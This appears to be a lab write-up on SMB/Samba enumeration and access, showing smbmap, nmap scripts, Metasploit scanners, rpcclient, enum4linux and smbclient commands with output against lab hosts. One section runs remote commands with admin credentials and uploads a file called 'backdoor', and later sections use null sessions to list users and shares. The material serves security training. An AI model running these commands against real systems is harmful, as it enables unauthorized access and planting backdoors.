# SMB

SMB (Server Message Block) is a protocol used for sharing files, printers, and other resources between devices on a network. It is commonly used in Windows operating systems and allows for easy file sharing between computers. The default port for SMB is 445, but it can also use port 139. However, due to security concerns, it's recommended to use SMB over VPN or with encryption enabled to prevent unauthorized access to shared resources.

## smbmap

smbmap is a command-line tool used for enumerating and interacting with SMB shares on Windows and Linux systems. It allows users to quickly scan for open SMB shares, list the available files and directories, and even execute commands on the remote system.

Here is how we can use smbmap on a network:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -d . -H 10.5.20.115
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers
```

We can also do command execution using this command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -x "ipconfig"
                                
Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::447d:2419:7782:5b26%22
   IPv4 Address. . . . . . . . . . . : 10.5.20.115
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.5.16.1

Tunnel adapter isatap.ap-south-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-south-1.compute.internal
```

`-L` - List all drives on the specified host, requires ADMIN rights. Example:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -L           
[+] Host 10.5.20.115 Local Drives: C:\ D:\
[+] Host 10.5.20.115 Net Drive(s):
	No mapped network drives
```

In this case, no mapped network drives were found.

We can connect a drive, such as C drive, by using the following command:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$'
[+] IP: 10.5.20.115:445	Name: 10.5.20.115                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Wed Dec 27 20:31:32 2023	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Wed Dec 27 20:53:23 2023	Windows
```

We can also upload a backdoor from our system to the target system:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --upload '/root/backdoor' 'C$\backdoor'
[+] Starting upload: /root/backdoor (0 bytes)
[+] Upload complete
```

We can read the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 -r 'C$' -x 'type flag.txt'
```

We can also download the file like this:

```sh
root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -H 10.5.20.115 --download 'C$\flag.txt'      
[+] Starting download: C$\flag.txt (32 bytes)
[+] File output to: /root/10.5.20.115-C_flag.txt
```

## SMB: Samba 1

Here we can see SMB is running on both TCP ports:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap -T4 192.251.29.3 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:46 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.0000090s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
<strong>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
</strong><strong>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
</strong>MAC Address: 02:42:C0:FB:1D:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
</code></pre>

But we forgot about UDP ports, they are also essential to enumerate, as you can see follow:

```
root@attackdefense:~# nmap -T4 192.251.29.3 -sU --top-port 25 -sV --open
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:51 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.000055s latency).
Not shown: 13 closed ports
PORT      STATE         SERVICE      VERSION
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
111/udp   open|filtered rpcbind
123/udp   open|filtered ntp
137/udp   open          netbios-ns   Samba nmbd netbios-ns (workgroup: RECONLABS)
138/udp   open|filtered netbios-dgm
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
631/udp   open|filtered ipp
49154/udp open|filtered unknown
MAC Address: 02:42:C0:FB:1D:03 (Unknown)
Service Info: Host: SAMBA-RECON

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.22 seconds
```

We can also utilize nmap scripts to further enumerate the port:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap 192.251.29.3 -p445 --script=smb-os-discovery
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-27 15:55 UTC
Nmap scan report for target-1 (192.251.29.3)
Host is up (0.000037s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:FB:1D:03 (Unknown)

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: victim-1
<strong>|   NetBIOS computer name: SAMBA-RECON\x00
</strong>|   Domain name: \x00
|   FQDN: victim-1
|_  System time: 2023-12-27T15:55:53+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
</code></pre>

Here we can also see the NetBIOS computer name.

We can also use metasploit-framework for the SMB enumeration, here is an example:

```sh
msf5 > use auxiliary/scanner/smb/smb_version 
msf5 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > set rhosts 192.251.29.3
rhosts => 192.251.29.3
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.251.29.3:445      - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
[*] 192.251.29.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## SMB: Samba 2

We can connect SMB using rpcclient with a null session like this:

```sh
root@attackdefense:~# rpcclient -U "" -N 192.10.80.3
rpcclient $> srvinfo
        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
```

We can also utilize another tool which is `enum4linux`:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# enum4linux -o 192.10.80.3
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 28 05:23:21 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.10.80.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 192.10.80.3    |
 =================================================== 
[+] Got domain/workgroup name: RECONLABS

 ==================================== 
|    Session Check on 192.10.80.3    |
 ==================================== 
<strong>[+] Server 192.10.80.3 allows sessions using username '', password ''
</strong>
 ========================================== 
|    Getting domain SID for 192.10.80.3    |
 ========================================== 
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 192.10.80.3    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.10.80.3 from smbclient: 
[+] Got OS info for 192.10.80.3 from srvinfo:
        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
        platform_id     :       500
<strong>        os version      :       6.1
</strong>        server type     :       0x809a03
enum4linux complete on Thu Dec 28 05:23:21 2023
</code></pre>

`-o` - Get OS information

Another tool we can utilize is `smbclient`:

```sh
root@attackdefense:~# smbclient -L 192.10.80.3 -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

`-L`/`--list` - allows you to look at what services are available on a server.

`-N` - null session

To know if it supports SMB 2, we can use Metasploit:

<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/smb/smb2
msf5 auxiliary(scanner/smb/smb2) > set RHOSTS 192.10.80.3
RHOSTS => 192.10.80.3
msf5 auxiliary(scanner/smb/smb2) > run

<strong>[+] 192.10.80.3:445       - 192.10.80.3 supports <a data-footnote-ref href="#user-content-fn-1">SMB 2</a> [dialect 255.2] and has been online for 3707837 hours
</strong>[*] 192.10.80.3:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

Here we can now see that it supports SMB 2.

We can also enumerate users using Nmap:

```sh
root@attackdefense:~# nmap 192.10.80.3 -p 445 --script=smb-enum-users
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-28 05:44 UTC
Nmap scan report for target-1 (192.10.80.3)
Host is up (0.000045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:0A:50:03 (Unknown)

Host script results:
| smb-enum-users: 
|   SAMBA-RECON\admin (RID: 1005)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\aisha (RID: 1004)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\elie (RID: 1002)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\emma (RID: 1003)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\john (RID: 1000)
|     Full name:   
|     Description: 
|     Flags:       Normal user account
|   SAMBA-RECON\shawn (RID: 1001)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

Or, we can also use `enum4linux` tool to get the user list:

```sh
root@attackdefense:~# enum4linux -U 192.10.80.3
...
...
...
 ============================ 
|    Users on 192.10.80.3    |
 ============================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: john     Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elie     Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: aisha    Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: shawn    Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: emma     Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
enum4linux complete on Thu Dec 28 05:47:22 2023
```

Another way, we can use `rpcclient` to get the userlist:

```sh
root@attackdefense:~# rpcclient -U "" -N 192.10.80.3
rpcclient $> enumdomusers
user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]
```

To get full SID of admin, we can use this command of `rpcclient`:

```sh
rpcclient $> lookupnames admin
admin S-1-5-21-4056189605-2085045094-1961111545-1005 (User: 1)
```

## SMB: Samba 3

To see the shares, we can use the following nmap script:

```sh
root@attackdefense:~# nmap 192.77.200.3 -p445 --script=smb-enum-shares
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-28 06:01 UTC
Nmap scan report for target-1 (192.77.200.3)
Host is up (0.000040s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:4D:C8:03 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.77.200.3\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.77.200.3\aisha: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\aisha
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.200.3\emma: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\emma
|     Anonymous access: <none>
|     Current user access: <none>
|   \\192.77.200.3\everyone: 
|     Type: STYPE_DISKTREE
....
...
..
.
```

Also, we can use Metasploit for this:

```sh
msf5 > use auxiliary/scanner/smb/smb_enumshares 
msf5 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.77.200.3
RHOSTS => 192.77.200.3
msf5 auxiliary(scanner/smb/smb_enumshares) > exploit

[+] 192.77.200.3:139      - public - (DS) 
[+] 192.77.200.3:139      - john - (DS) 
[+] 192.77.200.3:139      - aisha - (DS) 
[+] 192.77.200.3:139      - emma - (DS) 
[+] 192.77.200.3:139      - everyone - (DS) 
[+] 192.77.200.3:139      - IPC$ - (I) IPC Service (samba.recon.lab)
[*] 192.77.200.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We can also use `enum4linux` for this:

```sh
....
...
..
.
 ========================================= 
|    Share Enumeration on 192.77.200.3    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

[+] Attempting to map shares on 192.77.200.3
//192.77.200.3/public   Mapping: OK, Listing: OK
//192.77.200.3/john     Mapping: DENIED, Listing: N/A
//192.77.200.3/aisha    Mapping: DENIED, Listing: N/A
//192.77.200.3/emma     Mapping: DENIED, Listing: N/A
//192.77.200.3/everyone Mapping: DENIED, Listing: N/A
//192.77.200.3/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Thu Dec 28 06:08:16 2023
```

Same this we can do with smbclient:

```sh
root@attackdefense:~# smbclient -L 192.77.200.3 -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

We need to identify all the groups, which include users and shares, to determine who has different rights.

```sh
root@attackdefense:~# enum4linux -G 192.77.200.3
...
..
.
 ============================== 
|    Groups on 192.77.200.3    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Testing] rid:[0x3f0]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]
```

In this case, we have two different groups: Maintainer and Reserved.

Again the same thing we can do with `rpcclient`:

```sh
root@attackdefense:~# rpcclient -U "" 192.77.200.3 -N
rpcclient $> enumdomgroups
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]
```

To get information about printer, we can use the following command:

```
root@attackdefense:~# enum4linux -i 192.77.200.3
.
.
.
 ============================================= 
|    Getting printer info for 192.77.200.3    |
 ============================================= 
No printers returned.
```

In this case, no printers are found.

To connect with a share, as in my case I saw that the public was accessible. So we can use the following command to connect with the public:

```
root@attackdefense:~# smbclient //192.77.200.3/public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec 28 06:01:18 2023
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 202054372 blocks available
```

I found out that most of the commands in this are standard Linux commands. But some of the commands may not work in this scenario. For example, to read a file, we can't use `cat filename` a command. I used get command to download the file to my local system like this:

```
smb: \secret\> get flag
getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

[^1]: 
